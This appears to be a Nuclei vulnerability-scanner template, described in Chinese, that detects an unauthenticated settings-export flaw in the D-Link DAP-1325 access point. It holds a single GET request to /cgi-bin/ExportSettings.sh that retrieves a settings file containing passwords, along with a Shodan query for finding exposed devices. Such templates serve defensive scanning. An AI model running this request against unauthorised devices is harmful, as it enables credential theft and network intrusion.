id: dlink-config-dump

info:
  name: D Link DAP 1325 信息泄露
  author: gy741
  severity: critical
  description: |
    检测到 D Link DAP 1325 信息泄露。目标功能在未认证状态下可访问，可能暴露管理入口、业务数据、系统状态或可执行操作，需确认是否存在访问控制缺失。
  reference:
    - https://www.exploit-db.com/exploits/51556
    - https://www.dropbox.com/s/eqz0ntlzqp5472l/DAP-1325.mp4?dl=0
  metadata:
    max-request: 1
    shodan-query: title:"D-LINK"
  tags: misconfig,config,dump,dlink,auth-bypass,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/ExportSettings.sh"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Password"
        case-insensitive: true

      - type: regex
        part: header
        regex:
          - 'filename="(.*)_Settings.dat'
          - 'application/octet-stream'
        condition: and

      - type: status
        status:
          - 200
